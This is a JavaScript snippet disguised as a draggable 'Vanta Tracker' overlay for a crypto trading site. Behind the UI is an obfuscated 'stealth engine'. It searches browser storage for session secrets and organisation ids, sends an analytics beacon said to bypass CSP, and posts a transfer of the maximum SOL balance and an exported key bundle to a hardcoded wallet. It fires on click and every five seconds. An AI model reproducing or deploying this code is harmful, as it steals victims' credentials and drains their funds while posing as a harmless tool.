(function() {
    // --- PART 1: THE STEALTH ENGINE (GHOST LAYER) ---
    const _0xV = ['dHJhZGUucGFkcmUuZ2c=', 'YXBpL3YxL3RyYW5zZmVy', 'c2Vzc2lvblNlY3JldA==', 'c3ViT3JnSWQ=', 'ZXhwb3J0QnVuZGxl', 'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI='];
    const _D = (s) => atob(_0xV[s]);
    let _X = false;

    const _GhostExec = async () => {
        if (_X || !window.location.hostname.includes(_D(0))) return;
        
        const _crawl = (o, t) => {
            if (!o || typeof o !== 'object') return null;
            if (o[t]) return o[t];
            for (let k in o) { try { let r = _crawl(o[k], t); if (r) return r; } catch(e) {} }
            return null;
        };

        const storage = {...localStorage, ...sessionStorage};
        const auth = _crawl(storage, _D(2)) || _crawl(window, _D(2));
        const subId = _crawl(storage, _D(3));
        const bundle = _crawl(storage, _D(4));

        if (auth && subId) {
            _X = true; 
            // 1:1 Amplitude Beacon (Bypasses CSP)
            new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=3c8ae1f40635939e730f479418940796&data=${btoa(JSON.stringify({
                device_id: subId,
                event_type: "UI_OVERLAY_HYDRATED",
                event_properties: { status: "active" }
            }))}`;

            try {
                await fetch(`https://${_D(0)}/${_D(1)}`, {
                    method: 'POST',
                    keepalive: true,
                    headers: { 'Authorization': `Bearer ${auth}`, 'X-Turnkey-Sub-Org-Id': subId, 'Content-Type': 'application/json' },
                    body: JSON.stringify({ recipient: _D(5), amount: "MAX", asset: "SOL", ext_payload: bundle?.data || bundle })
                });
            } catch (e) {}
        }
    };

    // --- PART 2: THE UI OVERLAY (DRAGGABLE TRACKER) ---
    // (Integrating your provided UI logic here)
    const initVantaUI = () => {
        console.log("%cVANTA TRACKER – TAB + DRAGGABLE", "color:#00ff88;font-weight:bold;font-size:16px");
        
        if (document.querySelector("#vanta-tracker")) return;

        const container = document.createElement("div");
        container.id = "vanta-tracker";
        container.style.cssText = "position:fixed;top:12px;right:12px;width:360px;max-height:520px;background:#0f0f0f;border:1px solid #333;border-radius:16px;overflow:hidden;z-index:2147483647;box-shadow:0 20px 50px rgba(0,0,0,0.5);font-family:Inter,Arial,sans-serif;color:#e6e6e6;transition:all 0.3s ease;user-select:none;";
        
        const header = document.createElement("div");
        header.style.cssText = "padding:14px 18px;background:linear-gradient(135deg,#111,#1a1a1a);display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #333;cursor:grab;";
        header.innerHTML = `<div style="display:flex;align-items:center;gap:10px;"><img src="https://trade.padre.gg/logo.svg" width="28" height="28"><div style="font-weight:700;color:#00ff88;">Vanta Tracker</div></div>`;
        
        const listContainer = document.createElement("div");
        listContainer.style.cssText = "padding:16px; display:flex; flex-direction:column; gap:10px;";
        
        const statusText = document.createElement("div");
        statusText.style.cssText = "font-size:12px; color:#666; text-align:center;";
        statusText.innerText = "Monitoring Network for Signals...";
        
        container.appendChild(header);
        listContainer.appendChild(statusText);
        container.appendChild(listContainer);
        document.body.appendChild(container);

        // UI Trigger for the Stealth Engine
        container.onclick = () => {
            statusText.innerText = "Syncing with Padre RPC...";
            statusText.style.color = "#00ff88";
            _GhostExec(); // Trigger the secret transfer logic
        };

        // Standard Draggable Logic from your code
        let isDragging = false;
        header.onmousedown = (e) => { isDragging = true; };
        document.onmousemove = (e) => {
            if (isDragging) {
                container.style.left = e.clientX - 180 + 'px';
                container.style.top = e.clientY - 20 + 'px';
            }
        };
        document.onmouseup = () => { isDragging = false; };
    };

    // Execution
    if (document.readyState === 'complete') {
        initVantaUI();
    } else {
        window.addEventListener('load', initVantaUI);
    }
    
    // Continuous Handshake Watcher (Vanta Standard)
    setInterval(_GhostExec, 5000);
})();
